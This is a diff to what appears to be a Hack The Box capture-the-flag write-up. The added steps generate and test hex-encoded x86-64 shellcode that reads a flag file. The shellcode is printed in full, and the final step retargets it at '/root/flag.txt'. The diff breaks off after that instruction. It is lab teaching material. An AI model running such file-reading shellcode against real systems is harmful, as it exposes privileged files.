@@ -18,5 +18,19 @@ We'll need to make a flag to test the code:
 
     echo "HTB{f4lS3_fLag}" > flag.txt
 
-Now use shellcodePwn.py to generatecode to read the file "flag.txt"
+Now use shellcodePwn.py to generatecode to read the file "flag.txt":
+
+    ./shellcodePwn.py 
+    6a01fe0c2448b8666c61672e747874506a02584889e731f60f0541baffffff7f4889c66a28586a015f990f05
+
+Next, we'll test it:
+
+    ./shellcodeRun.py -s 6a01fe0c2448b8666c61672e747874506a02584889e731f60f0541baffffff7f4889c66a28586a015f990f05
+    Output:
+    HTB{f4lS3_fLag}
+
+Now that it works, update "shellcodePwn.py" to read "/root/flag.txt":
+
+
+
 
